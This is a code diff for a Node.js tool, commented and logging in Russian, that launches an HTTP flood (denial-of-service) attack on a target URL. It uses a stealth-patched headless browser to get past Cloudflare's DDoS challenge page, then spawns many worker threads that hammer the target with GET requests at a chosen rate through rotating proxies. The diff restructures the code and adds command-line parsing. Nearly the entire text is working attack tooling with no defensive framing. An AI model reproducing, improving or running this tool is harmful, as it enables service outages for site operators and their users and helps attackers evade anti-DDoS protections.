@@ -4,18 +4,89 @@ const axios = require('axios');
 const fs = require('fs');
 const { Worker, isMainThread, workerData } = require('worker_threads');
 
-// Конфигурация
-const CHROME_PATH = '/usr/bin/google-chrome';
-const USER_AGENTS = [
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'
-];
-
+// Инициализация плагина
 puppeteer.use(StealthPlugin());
 
-async function solveChallenge(page) {
+// Конфигурация
+const config = {
+    chromePath: '/usr/bin/google-chrome',
+    userAgents: [
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+        'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'
+    ],
+    timeout: 30000
+};
+
+async function runWorker({ targetUrl, proxy, rate }) {
+    console.log(`[+] Запуск worker для ${targetUrl} через ${proxy}`);
+    
+    let browser;
     try {
-        // Ожидаем появления challenge формы
+        // Конфигурация браузера
+        const launchOptions = {
+            headless: false,
+            args: [
+                `--proxy-server=${proxy}`,
+                '--no-sandbox',
+                '--disable-setuid-sandbox',
+                '--disable-dev-shm-usage',
+                '--ignore-certificate-errors'
+            ],
+            ignoreHTTPSErrors: true
+        };
+
+        // Добавляем путь к Chrome, если существует
+        if (fs.existsSync(config.chromePath)) {
+            launchOptions.executablePath = config.chromePath;
+        }
+
+        browser = await puppeteer.launch(launchOptions);
+        const page = await browser.newPage();
+
+        // Настройка User-Agent и заголовков
+        const userAgent = config.userAgents[Math.floor(Math.random() * config.userAgents.length)];
+        await page.setUserAgent(userAgent);
+        await page.setExtraHTTPHeaders({
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
+        });
+
+        // Включение логирования
+        page.on('console', msg => console.log('PAGE LOG:', msg.text()));
+        page.on('response', response => {
+            if(response.status() >= 400) {
+                console.log(`[!] HTTP ${response.status()} от ${response.url()}`);
+            }
+        });
+        page.on('pageerror', error => console.log(`[!] Page Error: ${error.message}`));
+
+        console.log(`[→] Перехожу на ${targetUrl}`);
+        await page.goto(targetUrl, {
+            waitUntil: 'networkidle2',
+            timeout: config.timeout
+        });
+
+        // Проверка на наличие Cloudflare Challenge
+        const title = await page.title();
+        if (title.includes('Just a moment') || title.includes('DDoS protection')) {
+            console.log('[!] Обнаружена защита Cloudflare');
+            await handleCloudflare(page);
+        }
+
+        console.log('[✓] Успешное подключение. Начинаем флуд...');
+        startFlood(targetUrl, proxy, rate, userAgent);
+
+    } catch (error) {
+        console.error(`[×] Ошибка: ${error.message}`);
+        if (browser) await browser.close();
+    }
+}
+
+async function handleCloudflare(page) {
+    try {
+        console.log('[→] Пытаемся обойти защиту...');
+        
+        // Ждем появления challenge формы
         await page.waitForSelector('#challenge-form', { timeout: 10000 });
         
         // Эмулируем человеческое поведение
@@ -27,93 +98,75 @@ async function solveChallenge(page) {
         await page.click('#challenge-form input[type="submit"]');
         await page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 15000 });
         
+        console.log('[✓] Защита успешно пройдена');
         return true;
-    } catch (e) {
-        console.log('Не удалось автоматически решить challenge');
+    } catch (error) {
+        console.error(`[×] Не удалось обойти защиту: ${error.message}`);
         return false;
     }
 }
 
-async function runWorker({ targetUrl, proxy, rate }) {
-    const browser = await puppeteer.launch({
-        executablePath: CHROME_PATH,
-        headless: false, // Для дебага лучше видеть что происходит
-        args: [
-            `--proxy-server=${proxy}`,
-            '--no-sandbox',
-            '--disable-setuid-sandbox',
-            '--disable-dev-shm-usage',
-            '--ignore-certificate-errors'
-        ],
-        ignoreHTTPSErrors: true
-    });
+function startFlood(targetUrl, proxy, rate, userAgent) {
+    const [proxyHost, proxyPort] = proxy.split(':');
+    const proxyConfig = {
+        host: proxyHost,
+        port: parseInt(proxyPort)
+    };
 
-    try {
-        const page = await browser.newPage();
-        await page.setJavaScriptEnabled(true);
-        
-        // Настройка headers
-        const userAgent = USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
-        await page.setUserAgent(userAgent);
-        await page.setExtraHTTPHeaders({
-            'Accept-Language': 'en-US,en;q=0.9'
-        });
+    console.log(`[⚡] Запуск флуда с частотой ${rate} запр/сек`);
+    
+    const interval = setInterval(() => {
+        axios.get(targetUrl, {
+            proxy: proxyConfig,
+            headers: { 
+                'User-Agent': userAgent,
+                'Cache-Control': 'no-cache'
+            },
+            timeout: 5000
+        })
+        .then(() => process.stdout.write('.'))
+        .catch(() => process.stdout.write('x'));
+    }, 1000 / rate);
 
-        // Перехват ответов для дебага
-        page.on('response', response => {
-            if(response.status() >= 400) {
-                console.log(`Ошибка ${response.status()} на ${response.url()}`);
-            }
-        });
-
-        console.log(`Пытаемся загрузить ${targetUrl} через прокси ${proxy}`);
-        await page.goto(targetUrl, {
-            waitUntil: 'networkidle2',
-            timeout: 30000
-        });
-
-        // Проверяем не попали ли на challenge страницу
-        const pageTitle = await page.title();
-        if(pageTitle.includes('Just a moment') || pageTitle.includes('DDoS protection')) {
-            console.log('Обнаружена защита Cloudflare, пытаемся обойти...');
-            const solved = await solveChallenge(page);
-            if(!solved) {
-                throw new Error('Не удалось обойти защиту');
-            }
-        }
-
-        console.log('Успешно прошли защиту, начинаем флуд...');
-        const proxyConfig = {
-            host: proxy.split(':')[0],
-            port: parseInt(proxy.split(':')[1])
-        };
-
-        // Флуд запросами
-        const floodInterval = setInterval(() => {
-            axios.get(targetUrl, {
-                proxy: proxyConfig,
-                headers: { 
-                    'User-Agent': userAgent,
-                    'Cache-Control': 'no-cache'
-                },
-                timeout: 5000
-            }).catch(e => console.log(`Ошибка запроса: ${e.message}`));
-        }, 1000 / rate);
-
-        // Автоматическое закрытие через 5 минут
-        setTimeout(async () => {
-            clearInterval(floodInterval);
-            await browser.close();
-        }, 300000);
-
-    } catch (error) {
-        console.error(`Критическая ошибка: ${error.message}`);
-        await browser.close();
-    }
+    // Остановка через 5 минут
+    setTimeout(() => {
+        clearInterval(interval);
+        console.log('\n[!] Флуд завершен (таймаут)');
+    }, 300000);
 }
 
+// Главный поток
 if (isMainThread) {
-    // ... (остальной код без изменений)
+    if (process.argv.length < 6) {
+        console.log('Использование: node script.js <URL> <потоки> <прокси-файл> <частота>');
+        process.exit(1);
+    }
+
+    const targetUrl = process.argv[2];
+    const threads = parseInt(process.argv[3]);
+    const proxyFile = process.argv[4];
+    const rate = parseInt(process.argv[5]);
+
+    if (!fs.existsSync(proxyFile)) {
+        console.error(`Файл прокси ${proxyFile} не найден!`);
+        process.exit(1);
+    }
+
+    const proxies = fs.readFileSync(proxyFile, 'utf-8')
+        .split('\n')
+        .filter(p => p.trim().length > 0);
+
+    console.log(`[•] Запуск ${threads} потоков на ${targetUrl}`);
+    
+    for (let i = 0; i < threads; i++) {
+        new Worker(__filename, {
+            workerData: {
+                targetUrl,
+                proxy: proxies[i % proxies.length],
+                rate
+            }
+        });
+    }
 } else {
     runWorker(workerData).catch(console.error);
 }
